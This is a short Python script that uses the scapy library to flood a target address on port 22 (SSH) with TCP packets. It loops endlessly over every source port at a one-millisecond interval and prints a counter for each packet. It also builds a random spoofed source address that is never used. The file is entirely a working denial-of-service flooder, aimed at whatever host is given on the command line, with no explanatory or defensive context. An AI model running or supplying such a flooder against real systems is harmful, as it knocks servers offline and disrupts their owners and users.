import random
import sys
from scapy.all import *
target_IP = sys.argv[1]
actual_source = sys.argv[2]
i = 1
source_ip = actual_source
while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = "."
   source_ip_rand = a + dot + b + dot + c + dot + d
   payload = "yada yada yada"

   for source_port in range(1, 65535):
        IP1 = IP(src = source_ip, dst = target_IP)
        TCP1 = TCP(sport = source_port, dport = 22)
        pkt = IP1 / TCP1 / payload
        send(pkt,inter = .001)

        print ("packet sent ", i)
        i = i + 1